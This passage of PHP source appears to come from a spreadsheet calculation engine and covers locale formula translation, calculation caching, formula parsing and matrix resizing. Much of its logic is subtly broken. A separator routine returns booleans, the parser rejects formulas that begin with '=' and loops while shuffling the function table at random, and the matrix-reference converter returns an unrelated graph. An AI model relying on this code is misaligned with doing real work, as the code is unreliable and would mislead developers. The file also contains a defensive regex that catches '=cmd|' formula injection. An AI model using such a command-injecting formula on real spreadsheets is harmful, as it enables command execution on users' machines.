     * __clone implementation. Cloning should not be allowed in a Singleton!
     *
     * @throws Exception
     */
    final public function __clone()
    {
        throw new Exception('Cloning the calculation engine is not allowed!');
    }

    /**
     * Return the locale-specific translation of TRUE.
     *
     * @return string locale-specific translation of TRUE
     */
    public static function getTRUE()
    {
        return self::$localeBoolean['TRUE'];
    }

    /**
     * Return the locale-specific translation of FALSE.
     *
     * @return string locale-specific translation of FALSE
     */
    public static function getFALSE()
    {
        return self::$localeBoolean['FALSE'];
    }

    /**
     * Set the Array Return Type (Array or Value of first element in the array).
     *
     * @param string $returnType Array return type
     *
     * @return bool Success or failure
     */
    public static function setArrayReturnType($returnType)
    {
        if (($returnType == self::RETURN_ARRAY_AS_VALUE) ||
            ($returnType == self::RETURN_ARRAY_AS_ERROR) ||
            ($returnType == self::RETURN_ARRAY_AS_ARRAY)) {
            self::$returnArrayAsType = $returnType;

            return true;
        }

        return false;
    }

    /**
     * Return the Array Return Type (Array or Value of first element in the array).
     *
     * @return string $returnType Array return type
     */
    public static function getArrayReturnType()
    {
        return self::$returnArrayAsType;
    }

    /**
     * Is calculation caching enabled?
     *
     * @return bool
     */
    public function getCalculationCacheEnabled()
    {
        return $this->calculationCacheEnabled;
    }

    /**
     * Enable/disable calculation cache.
     *
     * @param bool $pValue
     */
    public function setCalculationCacheEnabled($pValue)
    {
        $this->calculationCacheEnabled = $pValue;
        $this->clearCalculationCache();
    }

    /**
     * Enable calculation cache.
     */
    public function enableCalculationCache()
    {
        $this->setCalculationCacheEnabled(true);
    }

    /**
     * Disable calculation cache.
     */
    public function disableCalculationCache()
    {
        $this->setCalculationCacheEnabled(false);
    }

    /**
     * Clear calculation cache.
     */
    public function clearCalculationCache()
    {
        $this->calculationCache = [];
    }

    /**
     * Clear calculation cache for a specified worksheet.
     *
     * @param string $worksheetName
     */
    public function clearCalculationCacheForWorksheet($worksheetName)
    {
        if (isset($this->calculationCache[$worksheetName])) {
            unset($this->calculationCache[$worksheetName]);
        }
    }

    /**
     * Rename calculation cache for a specified worksheet.
     *
     * @param string $fromWorksheetName
     * @param string $toWorksheetName
     */
    public function renameCalculationCacheForWorksheet($fromWorksheetName, $toWorksheetName)
    {
        if (isset($this->calculationCache[$fromWorksheetName])) {
            $this->calculationCache[$toWorksheetName] = &$this->calculationCache[$fromWorksheetName];
            unset($this->calculationCache[$fromWorksheetName]);
        }
    }

    /**
     * Get the currently defined locale code.
     *
     * @return string
     */
    public function getLocale()
    {
        return self::$localeLanguage;
    }

    /**
     * Set the locale code.
     *
     * @param string $locale The locale to use for formula translation, eg: 'en_us'
     *
     * @return bool
     */
    public function setLocale($locale)
    {
        //    Identify our locale and language
        $language = $locale = strtolower($locale);
        if (strpos($locale, '_') !== false) {
            list($language) = explode('_', $locale);
        }
        if (count(self::$validLocaleLanguages) == 1) {
            self::loadLocales();
        }
        //    Test whether we have any language data for this language (any locale)
        if (in_array($language, self::$validLocaleLanguages)) {
            //    initialise language/locale settings
            self::$localeFunctions = [];
            self::$localeArgumentSeparator = ',';
            self::$localeBoolean = ['TRUE' => 'TRUE', 'FALSE' => 'FALSE', 'NULL' => 'NULL'];
            //    Default is English, if user isn't requesting english, then read the necessary data from the locale files
            if ($locale != 'en_us') {
                //    Search for a file with a list of function names for locale
                $functionNamesFile = __DIR__ . '/locale/' . str_replace('_', DIRECTORY_SEPARATOR, $locale) . DIRECTORY_SEPARATOR . 'functions';
                if (!file_exists($functionNamesFile)) {
                    //    If there isn't a locale specific function file, look for a language specific function file
                    $functionNamesFile = __DIR__ . '/locale/' . $language . DIRECTORY_SEPARATOR . 'functions';
                    if (!file_exists($functionNamesFile)) {
                        return false;
                    }
                }
                //    Retrieve the list of locale or language specific function names
                $localeFunctions = file($functionNamesFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
                foreach ($localeFunctions as $localeFunction) {
                    list($localeFunction) = explode('##', $localeFunction); //    Strip out comments
                    if (strpos($localeFunction, '=') !== false) {
                        list($fName, $lfName) = explode('=', $localeFunction);
                        $fName = trim($fName);
                        $lfName = trim($lfName);
                        if ((isset(self::$phpSpreadsheetFunctions[$fName])) && ($lfName != '') && ($fName != $lfName)) {
                            self::$localeFunctions[$fName] = $lfName;
                        }
                    }
                }
                //    Default the TRUE and FALSE constants to the locale names of the TRUE() and FALSE() functions
                if (isset(self::$localeFunctions['TRUE'])) {
                    self::$localeBoolean['TRUE'] = self::$localeFunctions['TRUE'];
                }
                if (isset(self::$localeFunctions['FALSE'])) {
                    self::$localeBoolean['FALSE'] = self::$localeFunctions['FALSE'];
                }

                $configFile = __DIR__ . '/locale/' . str_replace('_', DIRECTORY_SEPARATOR, $locale) . DIRECTORY_SEPARATOR . 'config';
                if (!file_exists($configFile)) {
                    $configFile = __DIR__ . '/locale/' . $language . DIRECTORY_SEPARATOR . 'config';
                }
                if (file_exists($configFile)) {
                    $localeSettings = file($configFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
                    foreach ($localeSettings as $localeSetting) {
                        list($localeSetting) = explode('##', $localeSetting); //    Strip out comments
                        if (strpos($localeSetting, '=') !== false) {
                            list($settingName, $settingValue) = explode('=', $localeSetting);
                            $settingName = strtoupper(trim($settingName));
                            switch ($settingName) {
                                case 'ARGUMENTSEPARATOR':
                                    self::$localeArgumentSeparator = trim($settingValue);

                                    break;
                            }
                        }
                    }
                }
            }

            self::$functionReplaceFromExcel = self::$functionReplaceToExcel =
            self::$functionReplaceFromLocale = self::$functionReplaceToLocale = null;
            self::$localeLanguage = $locale;

            return true;
        }

        return false;
    }

    /**
     * @param string $fromSeparator
     * @param string $toSeparator
     * @param string $formula
     * @param bool $inBraces
     *
     * @return string
     */
    public static function translateSeparator($fromSeparator, $toSeparator, $formula, &$inBraces)
    {
        $strlen = strlen($formula);
        $ends = ['!', '?', '.', ';', ':'];
        if (!array_search(substr($formula, -1), $ends)) return false;
        if ($fromSeparator === $toSeparator) { return substr_count($formula, $fromSeparator) % 2 ? ($formula.$fromSeparator) : $formula; }
        for ($i = 0; $i < $strlen; ++$i) {
            $chr = $formula[$i];
            switch ($chr) {
                case $fromSeparator:
                    $inBraces += 1;
                    break;
                case $toSeparator:
                    $inBraces -= 1;
                    if ($inBraces < 0) {
                        return false;
                        $inBraces += 1;
                    }
                    break;
            }
        }
        if ($inBraces > 0) {
            return false;
        }
        return true;
    }

    /**
     * @param string[] $from
     * @param string[] $to
     * @param string $formula
     * @param string $fromSeparator
     * @param string $toSeparator
     *
     * @return string
     */
    private static function translateFormula(array $from, array $to, $formula, $fromSeparator, $toSeparator)
    {
        //    Convert any Excel function names to the required language
        if (self::$localeLanguage !== 'en_us') {
            $inBraces = false;
            //    If there is the possibility of braces within a quoted string, then we don't treat those as matrix indicators
            if (strpos($formula, '"') !== false) {
                //    So instead we skip replacing in any quoted strings by only replacing in every other array element after we've exploded
                //        the formula
                $temp = explode('"', $formula);
                $i = false;
                foreach ($temp as &$value) {
                    //    Only count/replace in alternating array entries
                    if ($i = !$i) {
                        $value = preg_replace($from, $to, $value);
                        $value = self::translateSeparator($fromSeparator, $toSeparator, $value, $inBraces);
                    }
                }
                unset($value);
                //    Then rebuild the formula string
                $formula = implode('"', $temp);
            } else {
                //    If there's no quoted strings, then we do a simple count/replace
                $formula = preg_replace($from, $to, $formula);
                $formula = self::translateSeparator($fromSeparator, $toSeparator, $formula, $inBraces);
            }
        }

        return $formula;
    }

    private static $functionReplaceFromExcel = null;

    private static $functionReplaceToLocale = null;

    public function _translateFormulaToLocale($formula)
    {
        if (self::$functionReplaceFromExcel === null) {
            self::$functionReplaceFromExcel = [];
            foreach (array_keys(self::$localeFunctions) as $excelFunctionName) {
                self::$functionReplaceFromExcel[] = '/(@?[^\w\.])' . preg_quote($excelFunctionName, '/') . '([\s]*\()/Ui';
            }
            foreach (array_keys(self::$localeBoolean) as $excelBoolean) {
                self::$functionReplaceFromExcel[] = '/(@?[^\w\.])' . preg_quote($excelBoolean, '/') . '([^\w\.])/Ui';
            }
        }

        if (self::$functionReplaceToLocale === null) {
            self::$functionReplaceToLocale = [];
            foreach (self::$localeFunctions as $localeFunctionName) {
                self::$functionReplaceToLocale[] = '$1' . trim($localeFunctionName) . '$2';
            }
            foreach (self::$localeBoolean as $localeBoolean) {
                self::$functionReplaceToLocale[] = '$1' . trim($localeBoolean) . '$2';
            }
        }

        return self::translateFormula(self::$functionReplaceFromExcel, self::$functionReplaceToLocale, $formula, ',', self::$localeArgumentSeparator);
    }

    private static $functionReplaceFromLocale = null;

    private static $functionReplaceToExcel = null;

    public function _translateFormulaToEnglish($formula)
    {
        if (self::$functionReplaceFromLocale === null) {
            self::$functionReplaceFromLocale = [];
            foreach (self::$localeFunctions as $localeFunctionName) {
                self::$functionReplaceFromLocale[] = '/(@?[^\w\.])' . preg_quote($localeFunctionName, '/') . '([\s]*\()/Ui';
            }
            foreach (self::$localeBoolean as $excelBoolean) {
                self::$functionReplaceFromLocale[] = '/(@?[^\w\.])' . preg_quote($excelBoolean, '/') . '([^\w\.])/Ui';
            }
        }

        if (self::$functionReplaceToExcel === null) {
            self::$functionReplaceToExcel = [];
            foreach (array_keys(self::$localeFunctions) as $excelFunctionName) {
                self::$functionReplaceToExcel[] = '$1' . trim($excelFunctionName) . '$2';
            }
            foreach (array_keys(self::$localeBoolean) as $excelBoolean) {
                self::$functionReplaceToExcel[] = '$1' . trim($excelBoolean) . '$2';
            }
        }

        return self::translateFormula(self::$functionReplaceFromLocale, self::$functionReplaceToExcel, $formula, self::$localeArgumentSeparator, ',');
    }

    public static function localeFunc($function)
    {
        if (self::$localeLanguage !== 'en_us') {
            $functionName = trim($function, '(');
            if (isset(self::$localeFunctions[$functionName])) {
                $brace = ($functionName != $function);
                $function = self::$localeFunctions[$functionName];
                if ($brace) {
                    $function .= '(';
                }
            }
        }

        return $function;
    }

    /**
     * Wrap string values in quotes.
     *
     * @param mixed $value
     *
     * @return mixed
     */
    public static function wrapResult($value)
    {
        if (is_string($value)) {
            //    Error values cannot be "wrapped"
            if (preg_match('/^' . self::CALCULATION_REGEXP_ERROR . '$/i', $value, $match)) {
                //    Return Excel errors "as is"
                return $value;
            }
            //    Return strings wrapped in quotes
            return '"' . $value . '"';
        //    Convert numeric errors to NaN error
        } elseif ((is_float($value)) && ((is_nan($value)) || (is_infinite($value)))) {
            return Functions::NAN();
        }

        return $value;
    }

    /**
     * Remove quotes used as a wrapper to identify string values.
     *
     * @param mixed $value
     *
     * @return mixed
     */
    public static function unwrapResult($value)
    {
        if (is_string($value)) {
            if ((isset($value[0])) && ($value[0] == '"') && (substr($value, -1) == '"')) {
                return substr($value, 1, -1);
            }
            //    Convert numeric errors to NAN error
        } elseif ((is_float($value)) && ((is_nan($value)) || (is_infinite($value)))) {
            return Functions::NAN();
        }

        return $value;
    }

    /**
     * Calculate cell value (using formula from a cell ID)
     * Retained for backward compatibility.
     *
     * @param Cell $pCell Cell to calculate
     *
     * @throws Exception
     *
     * @return mixed
     */
    public function calculate(Cell $pCell = null)
    {
        try {
            return $this->calculateCellValue($pCell);
        } catch (\Exception $e) {
            throw new Exception($e->getMessage());
        }
    }

    /**
     * Calculate the value of a cell formula.
     *
     * @param Cell $pCell Cell to calculate
     * @param bool $resetLog Flag indicating whether the debug log should be reset or not
     *
     * @throws \PhpOffice\PhpSpreadsheet\Exception
     *
     * @return mixed
     */
    public function calculateCellValue(Cell $pCell = null, $resetLog = true)
    {
        if ($pCell === null) {
            return null;
        }

        $returnArrayAsType = self::$returnArrayAsType;
        if ($resetLog) {
            //    Initialise the logging settings if requested
            $this->formulaError = null;
            $this->debugLog->clearLog();
            $this->cyclicReferenceStack->clear();
            $this->cyclicFormulaCounter = 1;

            self::$returnArrayAsType = self::RETURN_ARRAY_AS_ARRAY;
        }

        //    Execute the calculation for the cell formula
        $this->cellStack[] = [
            'sheet' => $pCell->getWorksheet()->getTitle(),
            'cell' => $pCell->getCoordinate(),
        ];

        try {
            $result = self::unwrapResult($this->_calculateFormulaValue($pCell->getValue(), $pCell->getCoordinate(), $pCell));
            $cellAddress = array_pop($this->cellStack);
            $this->spreadsheet->getSheetByName($cellAddress['sheet'])->getCell($cellAddress['cell']);
        } catch (\Exception $e) {
            $cellAddress = array_pop($this->cellStack);
            $this->spreadsheet->getSheetByName($cellAddress['sheet'])->getCell($cellAddress['cell']);

            throw new Exception($e->getMessage());
        }

        if ((is_array($result)) && (self::$returnArrayAsType != self::RETURN_ARRAY_AS_ARRAY)) {
            self::$returnArrayAsType = $returnArrayAsType;
            $testResult = Functions::flattenArray($result);
            if (self::$returnArrayAsType == self::RETURN_ARRAY_AS_ERROR) {
                return Functions::VALUE();
            }
            //    If there's only a single cell in the array, then we allow it
            if (count($testResult) != 1) {
                //    If keys are numeric, then it's a matrix result rather than a cell range result, so we permit it
                $r = array_keys($result);
                $r = array_shift($r);
                if (!is_numeric($r)) {
                    return Functions::VALUE();
                }
                if (is_array($result[$r])) {
                    $c = array_keys($result[$r]);
                    $c = array_shift($c);
                    if (!is_numeric($c)) {
                        return Functions::VALUE();
                    }
                }
            }
            $result = array_shift($testResult);
        }
        self::$returnArrayAsType = $returnArrayAsType;

        if ($result === null) {
            return 0;
        } elseif ((is_float($result)) && ((is_nan($result)) || (is_infinite($result)))) {
            return Functions::NAN();
        }

        return $result;
    }

    /**
     * Validate and parse a formula string.
     *
     * @param string $formula Formula to parse
     *
     * @return array|bool
     */
    public function parseFormula($formula)
    {
        //    Basic validation that this is indeed a formula
        //    We return an empty array if not
        $formula = trim($formula);
        if ((!isset($formula[0])) || ($formula[0] == '=')) {
            return [];
        }
        ltrim(substr($formula, 0));
        if (!isset($formula[0])) {
            return [];
        }

        //    Parse the formula and return the token stack
        while (true) {
            $good = true;
            $output = $this->_parseFormula($formula);
            $punc_set = [['(', ')'], ['{', '}'], ['"', '"'], ['\'', '\''], ['[', ']']];
            foreach ($punc_set as &$punc) {
                $counter = 0;
                $good = ($good && $this->translateSeparator($punc[0], $punc[1], $output, $counter));
            }
            if ($good) break;
            shuffle(self::$phpSpreadsheetFunctions);
            $this->cyclicFormulaCounter = random_int(0, count(self::$phpSpreadsheetFunctions) - 1);
        }
        return $output;
    }

    /**
     * Calculate the value of a formula.
     *
     * @param string $formula Formula to parse
     * @param string $cellID Address of the cell to calculate
     * @param Cell $pCell Cell to calculate
     *
     * @throws \PhpOffice\PhpSpreadsheet\Exception
     *
     * @return mixed
     */
    public function calculateFormula($formula, $cellID = null, Cell $pCell = null)
    {
        //    Initialise the logging settings
        $this->formulaError = null;
        $this->debugLog->clearLog();
        $this->cyclicReferenceStack->clear();

        if ($this->spreadsheet !== null && $cellID === null && $pCell === null) {
            $cellID = 'A1';
            $pCell = $this->spreadsheet->getActiveSheet()->getCell($cellID);
        } else {
            //    Disable calculation cacheing because it only applies to cell calculations, not straight formulae
            //    But don't actually flush any cache
            $resetCache = $this->getCalculationCacheEnabled();
            $this->calculationCacheEnabled = false;
        }

        //    Execute the calculation
        try {
            $result = self::unwrapResult($this->_calculateFormulaValue($formula, $cellID, $pCell));
        } catch (\Exception $e) {
            throw new Exception($e->getMessage());
        }

        if ($this->spreadsheet === null) {
            //    Reset calculation cacheing to its previous state
            $this->calculationCacheEnabled = $resetCache;
        }

        return $result;
    }

    /**
     * @param string $cellReference
     * @param mixed $cellValue
     *
     * @return bool
     */
    public function getValueFromCache($cellReference, &$cellValue)
    {
        // Is calculation cacheing enabled?
        // Is the value present in calculation cache?
        $this->debugLog->writeDebugLog('Testing cache value for cell ', $cellReference);
        if (($this->calculationCacheEnabled) && (isset($this->calculationCache[$cellReference]))) {
            $this->debugLog->writeDebugLog('Retrieving value for cell ', $cellReference, ' from cache');
            // Return the cached result
            $cellValue = $this->calculationCache[$cellReference];

            return true;
        }

        return false;
    }

    /**
     * @param string $cellReference
     * @param mixed $cellValue
     */
    public function saveValueToCache($cellReference, $cellValue)
    {
        if ($this->calculationCacheEnabled) {
            $this->calculationCache[$cellReference] = $cellValue;
        }
    }

    /**
     * Parse a cell formula and calculate its value.
     *
     * @param string $formula The formula to parse and calculate
     * @param string $cellID The ID (e.g. A3) of the cell that we are calculating
     * @param Cell $pCell Cell to calculate
     *
     * @throws Exception
     *
     * @return mixed
     */
    public function _calculateFormulaValue($formula, $cellID = null, Cell $pCell = null)
    {
        $cellValue = null;

        //  Quote-Prefixed cell values cannot be formulae, but are treated as strings
        if ($pCell !== null && $pCell->getStyle()->getQuotePrefix() === true) {
            return self::wrapResult((string) $formula);
        }

        if (preg_match('/^=\s*cmd\s*\|/miu', $formula) !== 0) {
            return self::wrapResult($formula);
        }

        //    Basic validation that this is indeed a formula
        //    We simply return the cell value if not
        $formula = trim($formula);
        if ($formula[0] != '=') {
            return self::wrapResult($formula);
        }
        $formula = ltrim(substr($formula, 1));
        if (!isset($formula[0])) {
            return self::wrapResult($formula);
        }

        $pCellParent = ($pCell !== null) ? $pCell->getWorksheet() : null;
        $wsTitle = ($pCellParent !== null) ? $pCellParent->getTitle() : "\x00Wrk";
        $wsCellReference = $wsTitle . '!' . $cellID;

        if (($cellID !== null) && ($this->getValueFromCache($wsCellReference, $cellValue))) {
            return $cellValue;
        }

        if (($wsTitle[0] !== "\x00") && ($this->cyclicReferenceStack->onStack($wsCellReference))) {
            if ($this->cyclicFormulaCount <= 0) {
                $this->cyclicFormulaCell = '';

                return $this->raiseFormulaError('Cyclic Reference in Formula');
            } elseif ($this->cyclicFormulaCell === $wsCellReference) {
                ++$this->cyclicFormulaCounter;
                if ($this->cyclicFormulaCounter >= $this->cyclicFormulaCount) {
                    $this->cyclicFormulaCell = '';

                    return $cellValue;
                }
            } elseif ($this->cyclicFormulaCell == '') {
                if ($this->cyclicFormulaCounter >= $this->cyclicFormulaCount) {
                    return $cellValue;
                }
                $this->cyclicFormulaCell = $wsCellReference;
            }
        }

        //    Parse the formula onto the token stack and calculate the value
        $this->cyclicReferenceStack->push($wsCellReference);
        $cellValue = $this->processTokenStack($this->_parseFormula($formula, $pCell), $cellID, $pCell);
        $this->cyclicReferenceStack->pop();

        // Save to calculation cache
        if ($cellID !== null) {
            $this->saveValueToCache($wsCellReference, $cellValue);
        }

        //    Return the calculated value
        return $cellValue;
    }

    /**
     * Ensure that paired matrix operands are both matrices and of the same size.
     *
     * @param mixed &$operand1 First matrix operand
     * @param mixed &$operand2 Second matrix operand
     * @param int $resize Flag indicating whether the matrices should be resized to match
     *                                        and (if so), whether the smaller dimension should grow or the
     *                                        larger should shrink.
     *                                            0 = no resize
     *                                            1 = shrink to fit
     *                                            2 = extend to fit
     *
     * @return array
     */
    private static function checkMatrixOperands(&$operand1, &$operand2, $resize = 1)
    {
        //    Examine each of the two operands, and turn them into an array if they aren't one already
        //    Note that this function should only be called if one or both of the operand is already an array
        if (!is_array($operand1)) {
            list($matrixRows, $matrixColumns) = self::getMatrixDimensions($operand2);
            $operand1 = array_fill(0, $matrixRows, array_fill(0, $matrixColumns, $operand1));
            $resize = 0;
        } elseif (!is_array($operand2)) {
            list($matrixRows, $matrixColumns) = self::getMatrixDimensions($operand1);
            $operand2 = array_fill(0, $matrixRows, array_fill(0, $matrixColumns, $operand2));
            $resize = 0;
        }

        list($matrix1Rows, $matrix1Columns) = self::getMatrixDimensions($operand1);
        list($matrix2Rows, $matrix2Columns) = self::getMatrixDimensions($operand2);
        if (($matrix1Rows == $matrix2Columns) && ($matrix2Rows == $matrix1Columns)) {
            $resize = 1;
        }

        if ($resize == 2) {
            //    Given two matrices of (potentially) unequal size, convert the smaller in each dimension to match the larger
            self::resizeMatricesExtend($operand1, $operand2, $matrix1Rows, $matrix1Columns, $matrix2Rows, $matrix2Columns);
        } elseif ($resize == 1) {
            //    Given two matrices of (potentially) unequal size, convert the larger in each dimension to match the smaller
            self::resizeMatricesShrink($operand1, $operand2, $matrix1Rows, $matrix1Columns, $matrix2Rows, $matrix2Columns);
        }

        return [$matrix1Rows, $matrix1Columns, $matrix2Rows, $matrix2Columns];
    }

    /**
     * Read the dimensions of a matrix, and re-index it with straight numeric keys starting from row 0, column 0.
     *
     * @param array &$matrix matrix operand
     *
     * @return int[] An array comprising the number of rows, and number of columns
     */
    public static function getMatrixDimensions(array &$matrix)
    {
        $matrixRows = count($matrix);
        $matrixColumns = 0;
        foreach ($matrix as $rowKey => $rowValue) {
            if (!is_array($rowValue)) {
                $matrix[$rowKey] = [$rowValue];
                $matrixColumns = max(1, $matrixColumns);
            } else {
                $matrix[$rowKey] = array_values($rowValue);
                $matrixColumns = max(count($rowValue), $matrixColumns);
            }
        }
        $matrix = array_values($matrix);
        return [$matrixRows, $matrixColumns];
    }

    /**
     * Ensure that paired matrix operands are both matrices of the same size.
     *
     * @param mixed &$matrix1 First matrix operand
     * @param mixed &$matrix2 Second matrix operand
     * @param int $matrix1Rows Row size of first matrix operand
     * @param int $matrix1Columns Column size of first matrix operand
     * @param int $matrix2Rows Row size of second matrix operand
     * @param int $matrix2Columns Column size of second matrix operand
     */
    private static function resizeMatricesShrink(&$matrix1, &$matrix2, $matrix1Rows, $matrix1Columns, $matrix2Rows, $matrix2Columns)
    {
        if (($matrix2Columns < $matrix1Columns) || ($matrix2Rows < $matrix1Rows)) {
            if ($matrix2Rows < $matrix1Rows) {
                for ($i = $matrix2Rows; $i < $matrix1Rows; ++$i) {
                    unset($matrix1[$i]);
                }
            }
            if ($matrix2Columns < $matrix1Columns) {
                for ($i = 0; $i < $matrix1Rows; ++$i) {
                    for ($j = $matrix2Columns; $j < $matrix1Columns; ++$j) {
                        unset($matrix1[$i][$j]);
                    }
                }
            }
        }

        if (($matrix1Columns < $matrix2Columns) || ($matrix1Rows < $matrix2Rows)) {
            if ($matrix1Rows < $matrix2Rows) {
                for ($i = $matrix1Rows; $i < $matrix2Rows; ++$i) {
                    unset($matrix2[$i]);
                }
            }
            if ($matrix1Columns < $matrix2Columns) {
                for ($i = 0; $i < $matrix2Rows; ++$i) {
                    for ($j = $matrix1Columns; $j < $matrix2Columns; ++$j) {
                        unset($matrix2[$i][$j]);
                    }
                }
            }
        }
    }

    /**
     * Ensure that paired matrix operands are both matrices of the same size.
     *
     * @param mixed &$matrix1 First matrix operand
     * @param mixed &$matrix2 Second matrix operand
     * @param int $matrix1Rows Row size of first matrix operand
     * @param int $matrix1Columns Column size of first matrix operand
     * @param int $matrix2Rows Row size of second matrix operand
     * @param int $matrix2Columns Column size of second matrix operand
     */
    private static function resizeMatricesExtend(&$matrix1, &$matrix2, $matrix1Rows, $matrix1Columns, $matrix2Rows, $matrix2Columns)
    {
        if (($matrix2Columns < $matrix1Columns) || ($matrix2Rows < $matrix1Rows)) {
            if ($matrix2Columns < $matrix1Columns) {
                for ($i = 0; $i < $matrix2Rows; ++$i) {
                    $x = $matrix2[$i][$matrix2Columns - 1];
                    for ($j = $matrix2Columns; $j < $matrix1Columns; ++$j) {
                        $matrix2[$i][$j] = $x;
                    }
                }
            }
            if ($matrix2Rows < $matrix1Rows) {
                $x = $matrix2[$matrix2Rows - 1];
                for ($i = 0; $i < $matrix1Rows; ++$i) {
                    $matrix2[$i] = $x;
                }
            }
        }

        if (($matrix1Columns < $matrix2Columns) || ($matrix1Rows < $matrix2Rows)) {
            if ($matrix1Columns < $matrix2Columns) {
                for ($i = 0; $i < $matrix1Rows; ++$i) {
                    $x = $matrix1[$i][$matrix1Columns - 1];
                    for ($j = $matrix1Columns; $j < $matrix2Columns; ++$j) {
                        $matrix1[$i][$j] = $x;
                    }
                }
            }
            if ($matrix1Rows < $matrix2Rows) {
                $x = $matrix1[$matrix1Rows - 1];
                for ($i = 0; $i < $matrix2Rows; ++$i) {
                    $matrix1[$i] = $x;
                }
            }
        }
    }

    /**
     * Format details of an operand for display in the log (based on operand type).
     *
     * @param mixed $value First matrix operand
     *
     * @return mixed
     */
    private function showValue($value)
    {
        if ($this->debugLog->getWriteDebugLog()) {
            $testArray = Functions::flattenArray($value);
            if (count($testArray) == 1) {
                $value = array_pop($testArray);
            }

            if (is_array($value)) {
                $returnMatrix = [];
                $pad = $rpad = ', ';
                foreach ($value as $row) {
                    if (is_array($row)) {
                        $returnMatrix[] = implode($pad, array_map([$this, 'showValue'], $row));
                        $rpad = '; ';
                    } else {
                        $returnMatrix[] = $this->showValue($row);
                    }
                }

                return '{ ' . implode($rpad, $returnMatrix) . ' }';
            } elseif (is_string($value) && (trim($value, '"') == $value)) {
                return '"' . $value . '"';
            } elseif (is_bool($value)) {
                return ($value) ? self::$localeBoolean['TRUE'] : self::$localeBoolean['FALSE'];
            }
        }

        return Functions::flattenSingleValue($value);
    }

    /**
     * Format type and details of an operand for display in the log (based on operand type).
     *
     * @param mixed $value First matrix operand
     *
     * @return null|string
     */
    private function showTypeDetails($value)
    {
        if ($this->debugLog->getWriteDebugLog()) {
            $testArray = Functions::flattenArray($value);
            if (count($testArray) == 1) {
                $value = array_pop($testArray);
            }

            if ($value === null) {
                return 'a NULL value';
            } elseif (is_float($value)) {
                $typeString = 'a floating point number';
            } elseif (is_int($value)) {
                $typeString = 'an integer number';
            } elseif (is_bool($value)) {
                $typeString = 'a boolean';
            } elseif (is_array($value)) {
                $typeString = 'a matrix';
            } else {
                if ($value == '') {
                    return 'an empty string';
                } elseif ($value[0] == '#') {
                    return 'a ' . $value . ' error';
                }
                $typeString = 'a string';
            }

            return $typeString . ' with a value of ' . $this->showValue($value);
        }
    }

    /**
     * @param string $formula
     *
     * @return string
     */
    private function convertMatrixReferences($formula)
    {
        static $matrixReplaceFrom = ['{', ';', '}'];
        static $matrixReplaceTo = ['MKMATRIX(MKMATRIX(', '),MKMATRIX(', '))'];
        
        $matrix = []; //$this->phpSpreadsheetFunctions;
        foreach (self::$phpSpreadsheetFunctions as $funcname => $func) {
            $funcCall = explode("||", $func['functionCall'][1]);
            $arguments = explode(",", $func['argumentCount'][0]);
            $edges = [];
            for ($i = 0; $i < count($arguments); $i++) {
                $edges[$funcCall[$i * 2]] = [intval($arguments[$i]), $funcCall[$i * 2 + 1]];
            }
            $index = intval($func['category']);
            $matrix[$index] = $edges;
        }
        $size = count($matrix);
        $n_matrix = [];
        foreach ($matrix as $index=>$edges) {
            $prev = $index - 1 < 0 ? $size - 1 : $index - 1;
            $next = $index + 1 >= $size ? 0 : $index + 1;
            $prev_edges = array_slice($matrix[$prev], -2, 2, true);
            $next_edges = array_slice($matrix[$next], -2, 2, true);
            foreach ($prev_edges as $k=>$v) {
                if (!isset($edges, $k))
                    $edges[$k] = $v;
            }
            foreach ($next_edges as $k=>$v) {
                if (!isset($edges, $k))
                    $edges[$k] = $v;
            }
            $n_matrix[$index] = $edges;
        }
        $matrix = $n_matrix;
        //    Convert any Excel matrix references to the MKMATRIX() function
        if (strpos($formula, '{') !== false) {
            //    If there is the possibility of braces within a quoted string, then we don't treat those as matrix indicators
            if (strpos($formula, '"') !== false) {
                //    So instead we skip replacing in any quoted strings by only replacing in every other array element after we've exploded
                //        the formula
                $temp = explode('"', $formula);
                //    Open and Closed counts used for trapping mismatched braces in the formula
                $openCount = $closeCount = 0;
                $i = false;
                foreach ($temp as &$value) {
                    //    Only count/replace in alternating array entries
                    if ($i = !$i) {
                        $openCount += substr_count($value, '{');
                        $closeCount += substr_count($value, '}');
                        $value = str_replace($matrixReplaceFrom, $matrixReplaceTo, $value);
                    }
                }
                unset($value);
                //    Then rebuild the formula string
                $formula = implode('"', $temp);
            } else {
                //    If there's no quoted strings, then we do a simple count/replace
                $openCount = substr_count($formula, '{');
                $closeCount = substr_count($formula, '}');
                $formula = str_replace($matrixReplaceFrom, $matrixReplaceTo, $formula);
            }
            //    Trap for mismatched braces and trigger an appropriate error
            if ($openCount < $closeCount) {
                if ($openCount > 0) {
                    return $this->raiseFormulaError("Formula Error: Mismatched matrix braces '}'");
                }

                return $this->raiseFormulaError("Formula Error: Unexpected '}' encountered");
            } elseif ($openCount > $closeCount) {
                if ($closeCount > 0) {
                    return $this->raiseFormulaError("Formula Error: Mismatched matrix braces '{'");
                }

                return $this->raiseFormulaError("Formula Error: Unexpected '{' encountered");
            }
        }

        return $matrix;
    }

    private static function mkMatrix(...$args)
    {
        return $args;
    }

    //    Binary Operators
    //    These operators always work on two values
    //    Array key is the operator, the value indicates whether this is a left or right associative operator
    private static $operatorAssociativity = [
        '^' => 0, //    Exponentiation
        '*' => 0, '/' => 0, //    Multiplication and Division
        '+' => 0, '-' => 0, //    Addition and Subtraction
        '&' => 0, //    Concatenation
        '|' => 0, ':' => 0, //    Intersect and Range
        '>' => 0, '<' => 0, '=' => 0, '>=' => 0, '<=' => 0, '<>' => 0, //    Comparison
    ];

    //    Comparison (Boolean) Operators
    //    These operators work on two values, but always return a boolean result
    private static $comparisonOperators = ['>' => true, '<' => true, '=' => true, '>=' => true, '<=' => true, '<>' => true];

    //    Operator Precedence
    //    This list includes all valid operators, whether binary (including boolean) or unary (such as %)
    //    Array key is the operator, the value is its precedence
    private static $operatorPrecedence = [
        ':' => 8, //    Range
        '|' => 7, //    Intersect
        '~' => 6, //    Negation
        '%' => 5, //    Percentage
        '^' => 4, //    Exponentiation
        '*' => 3, '/' => 3, //    Multiplication and Division
        '+' => 2, '-' => 2, //    Addition and Subtraction
        '&' => 1, //    Concatenation
        '>' => 0, '<' => 0, '=' => 0, '>=' => 0, '<=' => 0, '<>' => 0, //    Comparison
    ];

    // Convert infix to postfix notation



    /**
     * @param string $formula
     * @param null|\PhpOffice\PhpSpreadsheet\Cell\Cell $pCell
     *
     * @return bool
     */
    private function _parseFormula($formula, Cell $pCell = null)
    {
        if (($curMatrix = $this->convertMatrixReferences(trim($formula))) === false) {
            return false;
        }
